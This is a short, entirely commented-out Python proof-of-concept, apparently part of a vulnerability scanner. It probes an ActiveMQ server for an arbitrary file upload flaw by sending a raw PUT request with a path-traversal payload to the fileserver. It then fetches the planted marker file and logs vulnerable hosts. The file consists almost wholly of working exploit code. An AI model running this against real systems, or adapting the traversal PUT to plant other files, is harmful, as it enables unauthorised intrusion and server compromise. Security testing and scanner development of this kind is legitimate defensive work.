# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-06 21:45

# try:
#     s = socket.socket()
#     s.connect((ip, 80))
#     filename = random_str(6)
#     flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n" % (
#         filename)
#     s.send(flag)
#     time.sleep(1)
#     s.recv(1024)
#     s.close()
#     url = 'http://' + ip + ":" + str(80) + '/styles/%s.txt' % (filename)
#     res_html = urllib2.urlopen(url, timeout=timeout).read(1024)
#     if 'xxscan0' in res_html:
#         with open('result.txt', 'a+')as aaa:
#             aaa.write('ActiveMQ任意文件上传漏洞 : ' + str(url) + '\n')
# except Exception, e:
#     pass
# finally:
#     s.close()